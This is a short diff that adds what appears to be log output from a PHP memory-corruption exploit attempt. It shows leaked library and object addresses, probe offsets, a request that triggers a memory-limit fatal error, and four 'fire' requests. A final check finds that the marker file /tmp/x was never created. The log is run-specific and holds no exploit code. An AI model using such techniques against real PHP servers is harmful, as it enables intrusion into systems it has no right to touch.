@@ -1,0 +1,10 @@
+    libphp=0x7f1b442ec000
+    probe offs=[139755050243690, 139755050243858, 139755050244026, 139755050244194]
+    V=0x7f1b4220166a
+    OBJ=0x7f1b422017ea (BOFF=384)
+    sacrifice: 200 b'<br />\n<b>Fatal error</b>:  Allowed memory size of'
+    fire0: 200
+    fire1: 200
+    fire2: 200
+    fire3: 200
+done; /tmp/x=cat: /tmp/x: No such file or directory
